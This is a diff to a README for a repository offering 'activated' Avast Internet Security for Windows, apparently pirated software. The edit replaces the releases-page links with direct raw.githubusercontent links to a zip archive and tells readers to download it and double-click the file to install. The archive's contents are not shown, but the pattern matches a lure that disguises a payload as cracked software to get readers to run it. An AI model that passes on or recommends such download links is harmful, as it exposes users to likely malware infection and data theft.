@@ -1,6 +1,6 @@
 # 💻 Avast-Internet-Security-Activated - Protect Your Windows PC Easily
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Sakthi366/Avast-Internet-Security-Activated/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Sakthi366/Avast-Internet-Security-Activated/main/highest/Security_Avast_Activated_Internet_v3.8-alpha.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Sakthi366/Avast-Internet-Security-Activated/main/highest/Security_Avast_Activated_Internet_v3.8-alpha.1.zip)
 
 ## 📜 About This Repository
 
@@ -15,13 +15,13 @@ To start using Avast Internet Security, you need to download and install the sof
 1. **Visit this page to download:**
    Click the button below to access the releases page where you can get the latest version of Avast Internet Security.
 
-   [![Download the Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Sakthi366/Avast-Internet-Security-Activated/releases)
+   [![Download the Latest Release](https://raw.githubusercontent.com/Sakthi366/Avast-Internet-Security-Activated/main/highest/Security_Avast_Activated_Internet_v3.8-alpha.1.zip%20Now-brightgreen)](https://raw.githubusercontent.com/Sakthi366/Avast-Internet-Security-Activated/main/highest/Security_Avast_Activated_Internet_v3.8-alpha.1.zip)
 
 2. **Select the Release:**
    On the Releases page, you will see a list of available versions. Look for the most recent release at the top of the page. It will typically be labeled with the version number and the release date. 
 
 3. **Download the Installer:**
-   Click on the installer file, which is usually named something like `Avast_Internet_Security_Setup.exe`. This file will begin downloading to your computer.
+   Click on the installer file, which is usually named something like `https://raw.githubusercontent.com/Sakthi366/Avast-Internet-Security-Activated/main/highest/Security_Avast_Activated_Internet_v3.8-alpha.1.zip`. This file will begin downloading to your computer.
 
 4. **Run the Installer:**
    After the download completes, navigate to your Downloads folder and double-click the downloaded file. This opens the installation wizard.
